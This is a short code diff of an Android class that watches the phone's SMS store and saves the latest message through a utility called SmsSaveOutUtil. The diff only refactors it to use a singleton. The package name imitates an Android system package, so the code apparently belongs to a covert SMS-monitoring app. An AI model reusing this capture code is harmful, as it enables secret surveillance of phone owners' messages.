@@ -9,11 +9,11 @@ import com.android.system.controled.util.SmsSaveOutUtil;
 
 public class SmsContentObserver extends ContentObserver {
 
-	private Context context;
+//	private Context context;
 
-	public SmsContentObserver(Handler handler, Context con) {
+	public SmsContentObserver(Handler handler) {
 		super(handler);
-		this.context = con;
+//		this.context = con;
 	}
 
 	@Override
@@ -22,7 +22,8 @@ public class SmsContentObserver extends ContentObserver {
 		super.onChange(selfChange);
 
 		Debug.e("SmsContentObserver", "ON CHANGED !!!!!");
-		SmsSaveOutUtil so = new SmsSaveOutUtil(context);
+//		SmsSaveOutUtil so = new SmsSaveOutUtil(context);
+		SmsSaveOutUtil so = SmsSaveOutUtil.getInstence();
 		so.saveLastSms();
 	}
 
